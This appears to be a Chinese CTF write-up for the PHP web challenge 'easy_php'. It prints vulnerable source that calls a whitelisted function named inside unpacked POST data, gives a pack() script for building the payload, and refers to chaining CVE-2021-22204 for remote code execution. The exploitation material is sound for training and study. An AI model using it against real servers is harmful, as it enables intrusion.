# easy_php

> 分类：Web

## 题目描述

PHP 上传 + unpack 解析题。`savePostData()` 用 unpack 解析 HTTP 原始 POST 数据，白名单函数（readfile/unserialize/phpinfo）作为文件名调用。

## 考察知识点

- unpack 数据构造
- 白名单函数绕过

## 解法

源码：

```php
function savePostData() {
    $content = $GLOBALS['HTTP_RAW_POST_DATA'];
    if (empty($content)) { $content = file_get_contents('php://input'); }
    ...
    $format = 'lnDataLen/lnHeadLen/lnPackTotal/lnPackNum/lnFileNameLen/lnFileDataLen';
    $head = unpack($format, $content);
    $format = 'lnDataLen/lnHeadLen/lnPackTotal/lnPackNum/lnFileNameLen/lnFileDataLen'
        . '/a' . ($head["nFileNameLen"]) . 'chFileName'
        . '/a' . ($head["nFileDataLen"]) . 'data';
    $head = unpack($format, $content);
    if (is_string($head["chFileName"])) {
        $fileName = $head["chFileName"];
        $white_func = array("readfile", "unserialize", "phpinfo");
        if (!in_array($fileName, $white_func)) { exit("hi hack!"); }
        $fileName($head["data"]);
    }
}
```

构造 unpack 数据：

```php
<?php
function savePostData($fn, $data) {
    $datalen = strlen($data);
    $fnlen = strlen($fn);
    $content = pack("l6a".$fnlen."a".$datalen, 1, 2, 3, 4, $fnlen, $datalen, $fn, $data);
    var_dump(urlencode($content), strlen($content));
}
$white_func = array("readfile", "unserialize", "phpinfo");
savePostData($white_func[2], '99999');
```

将得到的数据在 burp 的 hex 页面逐个插入字符发送。（后续结合 CVE-2021-22204 打 RCE）

## 参考答案

（flag 通过构造 unpack 数据 + CVE-2021-22204 RCE 读取）

## 来源

- 作者：h0cksr | https://cloud.tencent.com/developer/article/2287454
